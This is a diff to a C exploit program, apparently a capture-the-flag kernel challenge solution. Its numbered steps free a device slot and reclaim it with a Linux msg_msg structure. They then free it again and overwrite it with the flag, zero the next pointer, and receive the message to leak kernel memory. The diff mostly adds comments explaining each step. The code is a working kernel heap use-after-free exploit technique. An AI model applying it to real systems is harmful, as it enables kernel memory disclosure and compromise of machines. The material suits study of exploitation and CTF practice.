@@ -185,32 +185,32 @@ int main(){
     // step 1: open_device
     int fd = open_device(); 
 
-    // step 2: free the slot
-    free_slot(fd,buf,0x1d0);
+    // step 2: free the slot A
+    free_slot(fd,buf,0x1d0); 
     
     // step 3: make the msg use the freed slot
     int msg_id = msg_create_queue();
     struct message ingoing;
     memset(ingoing.text,0x61,MESSAGE_SIZE);
     ingoing.type = 1; // >= 0 is necessary
-    msg_send(msg_id,&ingoing,MESSAGE_SIZE,0);  // now msg
+    msg_send(msg_id,&ingoing,MESSAGE_SIZE,0);  // now msg structure is  msg_msg -> A
 
     // step 4: free the msg_seg again
-    free_slot(fd,buf,0x1d0); 
+    free_slot(fd,buf,0x1d0);  // A is freed
 
     // step 5: get flag to the msg_seg
-    copy_flag(fd,buf,0x1d0);
+    copy_flag(fd,buf,0x1d0); // A is allocated , and contents have been changed
 
-    // step 6: set the next_ptr to 0
+    // step 6: set the A->next_ptr to 0
     memset(buf,0,1048);
     write_slot(fd,buf,8);
 
     // step 7: recv the msg
     struct message outgoing;
-    msg_recv(msg_id,&outgoing,MESSAGE_SIZE,0,0);
+    msg_recv(msg_id,&outgoing,MESSAGE_SIZE,0,0); // now mag_msg and A are freed
 
     // step 8: resume the env
-    copy_flag(fd,buf,0x1d0);
+    copy_flag(fd,buf,0x1d0); // in order to avoid kernel panic(caused by freeing  freed_slot)
 
     memcpy(buf,outgoing.text+DATAMSG_LEN,DATAMSGSEG_LEN);
     printf("%s\n",buf);
